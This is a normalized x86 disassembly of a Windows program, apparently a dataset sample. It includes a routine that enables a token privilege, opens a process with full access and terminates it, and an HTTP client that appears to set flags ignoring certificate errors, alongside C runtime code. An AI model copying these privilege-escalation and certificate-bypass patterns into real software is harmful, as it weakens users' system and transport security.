push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
mov ebp [ OpenProcessToken@IAT ]
push eax
call ebp
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0x44
retn
push edi
push 0x1
push 0x1fffff
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ CloseHandle@IAT ]
call edi
lea ecx [ esp + 0x18 ]
push ecx
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call ebp
test eax eax
je r-xdata
push 0x0
push edi
call [ TerminateProcess@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x44 ] edx
mov edx [ esp + 0x24 ]
push 0x0
push edx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
mov eax [ esp + 0x14 ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
mov ebp ebx
lea edx [ esp + 0x28 ]
push edx
push r--data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x4c ]
push edx
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x28 ]
push 0x0
push eax
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] 0x0
call [ AdjustTokenPrivileges@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call edi
call [ GetLastError@IAT ]
sub_40ddf0
mov eax [ esi + 0x8 ]
push edi
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x8 ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_40de20
push ecx
mov eax edx
push edi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push 0x0
je r-xdata
push r--data
push r--data
push 0x0
push 0x0
push edx
push 0x3
jmp r-xdata
mov eax 0x1
pop edi
pop ecx
retn
mov eax [ esi + 0x8 ]
mov edi [ InternetCloseHandle@IAT ]
test eax eax
je r-xdata
push r--data
call [ InternetOpenA@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x8 ] 0x0
xor eax eax
pop edi
pop ecx
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_40de90
sub esp 0xc
push ebx
push esi
push edi
mov edi [ esp + 0x1c ]
or ebx 0xffffffff
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] ebx
push 0x0
test edi edi
je r-xdata
push 0x84080000
push 0x0
push 0x0
push r--data
push eax
push ecx
mov ecx [ edx + 0x8 ]
push ecx
push 0x84880000
push 0x0
push 0x0
push r--data
push eax
mov eax [ edx + 0x8 ]
push ecx
push eax
jmp r-xdata
test edi edi
mov edi [ InternetSetOptionA@IAT ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn 0x4
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x4
lea eax [ esp + 0x18 ]
push eax
push 0x41
push esi
mov [ esp + 0x24 ] 0x0
call edi
cmp [ esp + 0x1c ] ebx
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push 0x1f
push esi
mov [ esp + 0x20 ] 0x4
call [ InternetQueryOptionA@IAT ]
or [ rw-data ] 0x3180
push 0x4
push rw-data
push 0x1f
push esi
call edi
cmp [ esp + 0xc ] ebx
je r-xdata
push 0x4
lea ecx [ esp + 0x20 ]
push ecx
push 0x6
push esi
call edi
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
add esp 0xc
retn 0x4
push 0x4
lea edx [ esp + 0x10 ]
push edx
push 0x5
push esi
call edi
test eax eax
je r-xdata
sub_40df80
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
push 0x3ff
lea eax [ esp + 0x5 ]
push 0x0
push eax
mov [ esp + 0xc ] 0x0
call sub_414890
push ebx
push edi
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40e24c
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea edx [ esp + 0x8 ]
push edx
push esi
call [ HttpAddRequestHeadersA@IAT ]
mov ecx [ esp + 0x400 ]
xor ecx esp
call sub_40e1e0
add esp 0x404
retn
sub_40dff0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push esi
mov esi [ rw-data ]
xor eax eax
push 0x0
push 0x8
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
mov [ esp + 0x1c ] 0x28
mov [ esp + 0x38 ] eax
call [ HttpSendRequestExA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40e070
sub esp 0x8
lea eax [ esp ]
push eax
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
push 0x20000005
push eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x4
call [ HttpQueryInfoA@IAT ]
add esp 0x8
retn 0x4
sub_40e0b0
push ecx
xor eax eax
push ebp
mov ebp [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov [ esp + 0xc ] eax
cmp ebp eax
jne r-xdata
push esi
mov esi [ HttpQueryInfoA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
push eax
push 0x1
push ebx
call esi
mov eax [ esp + 0x10 ]
cmp eax [ edi ]
ja r-xdata
pop ebp
pop ecx
retn 0x4
pop esi
xor eax eax
pop ebp
pop ecx
retn 0x4
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push edi
push ebp
push 0x1
push ebx
call esi
pop esi
pop ebp
pop ecx
retn 0x4
sub_40e110
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
retn 0x8
call [ GetLastError@IAT ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] eax
xor eax eax
retn 0x8
sub_40e13b
push 0x44
mov eax sub_4207d8
call sub_410b3d
push r--data
lea ecx [ ebp - 0x28 ]
call sub_408300
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_401150
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_41070b
int3
sub_40e173
push 0x44
mov eax sub_4207d8
call sub_410b3d
push r--data
lea ecx [ ebp - 0x28 ]
call sub_408300
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_401170
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_41070b
int3
sub_40e1ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40fdd0
add esp 0xc
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
sub_40e24c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_410f41
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_410d37
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40e2c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
push ebx
xor ebx ebx
push edi
mov edi eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
mov eax [ edi + 0x14 ]
cdq
mov ecx eax
mov eax edx
mov [ ebp - 0x14 ] ecx
add ecx 0xffffffbb
mov [ ebp - 0x10 ] eax
adc eax 0xffffffff
push esi
cmp eax ebx
ja r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_410cee
or edx 0xffffffff
mov [ eax ] 0x16
mov eax edx
jb r-xdata
pop edi
pop ebx
leave
retn
mov eax [ edi + 0x10 ]
cmp eax ebx
jl r-xdata
cmp ecx 0x408
ja r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov ecx edx
cdq
add [ ebp - 0x14 ] eax
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] edx
cmp ecx ebx
jge r-xdata
cmp eax 0xb
jle r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add ecx 0xffffffbb
adc eax 0xffffffff
cmp eax ebx
ja r-xdata
add ecx 0xc
add [ ebp - 0x14 ] 0xffffffff
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] 0xffffffff
mov esi [ edi + 0x10 ]
mov eax [ esi * 4 + rw-data ]
push ebx
push 0x4
push [ ebp - 0x10 ]
cdq
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
call sub_412960
or eax edx
mov ebx 0x190
jne r-xdata
jb r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
push 0x0
add eax 0x76c
push ebx
adc ecx 0x0
push ecx
push eax
call sub_412960
or eax edx
jne r-xdata
push 0x0
push 0x64
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_412960
or eax edx
jne r-xdata
cmp ecx 0x408
ja r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
push 0x0
pop ecx
sub esi 0x1
sbb eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push ecx
add eax 0x12b
push ebx
adc edx ecx
push edx
push eax
mov [ ebp - 0x24 ] esi
call sub_4128b0
mov ebx eax
mov eax edx
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
cdq
push 0x0
push 0x64
push [ ebp - 0x20 ]
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_4128b0
push 0x0
push 0x4
push [ ebp - 0x20 ]
sub ebx eax
mov eax [ ebp - 0xc ]
sbb eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_4128b0
push 0x0
push 0x16d
push [ ebp - 0x10 ]
add ebx eax
mov eax [ ebp - 0xc ]
push [ ebp - 0x14 ]
adc eax edx
mov [ ebp - 0xc ] eax
call sub_412870
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
add ebx [ ebp - 0x1c ]
push 0x0
adc eax [ ebp - 0x18 ]
pop esi
push esi
sub ebx 0x63df
push 0x18
sbb eax esi
push eax
push ebx
call sub_412870
mov ecx eax
mov eax [ edi + 0x8 ]
mov ebx edx
cdq
push esi
add eax ecx
push 0x3c
adc edx ebx
push edx
push eax
call sub_412870
mov ecx eax
mov eax [ edi + 0x4 ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
push esi
push 0x3c
push edx
push eax
call sub_412870
mov ecx eax
mov eax [ edi ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
cmp [ ebp + 0x8 ] esi
je r-xdata
cmp esi 0x1
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_411ad9
call sub_4127df
lea eax [ ebp - 0x8 ]
push eax
call sub_41200d
pop ecx
test eax eax
je r-xdata
add [ ebp - 0x1c ] 0x1
adc [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
push 0x9
pop ecx
lea esi [ ebp - 0x48 ]
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_412046
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
pop esi
mov eax [ ebp - 0x4 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_411d1c
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
mov eax [ edi + 0x20 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_411d1c
jmp r-xdata
jge r-xdata
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] esi
jle r-xdata
sub_40e590
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40e5c4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40e5f8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41371e
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4133a4
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_412c38
mov [ esi + 0x4 ] eax
sub_40e67f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_413a62
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_413a62
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_413bb0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_40e771
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e67f
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_413bb0
sub_40e7e0
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_410680
mov esi eax
inc esi
push esi
call sub_410212
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_413c11
add esp 0xc
jmp r-xdata
sub_40e850
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_410680
mov edi eax
inc edi
push edi
call sub_410212
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_413c11
add esp 0xc
jmp r-xdata
sub_40e8d0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40e8ad
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40f2fb
pop ecx
sub_40e900
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_40e9ce
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_413495
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_413495
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_414004
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_41341a
mov [ esi ] eax
add esi 0x4
push esi
call sub_41341a
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_413f64
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_413f64
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_41341a
pop ecx
mov [ rw-data ] eax
sub_40ea88
mov edi edi
push esi
push 0x4
push 0x20
call sub_413f18
mov esi eax
push esi
call sub_41341a
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40eab9
push 0xc
push r--data
call sub_4143e0
call sub_414143
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40e9ce
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eaef
mov eax [ ebp - 0x1c ]
call sub_414425
retn
sub_40eb0c
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_4136a5
test eax eax
je r-xdata
push r--data
call sub_414660
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_413867
pop ecx
call [ r--data ]
sub_40eb8a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_413530
call sub_41352a
push eax
call sub_413510
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_413738
mov esi [ ebp + 0x8 ]
push esi
call sub_41352a
push eax
call sub_413564
test eax eax
jne r-xdata
call sub_40eb49
push r--data
call sub_414660
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_40ec0d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_413530
push 0x214
push 0x1
call sub_413f18
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_410135
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_41371e
push [ eax + 0x6c ]
push esi
call sub_4135be
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_410d14
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_40eb8a
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_40eccc
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_414890
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_41487e
pop ecx
sub_40edf4
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_413495
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_41487e
pop ecx
pop ebp
jmp sub_40eccc
pop ebp
jmp eax
sub_40ee2a
push 0xc
push r--data
call sub_4143e0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_410cee
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_414425
retn
call sub_414d88
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_410cee
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_414abf
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eee4
mov eax [ ebp - 0x1c ]
call sub_410cee
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
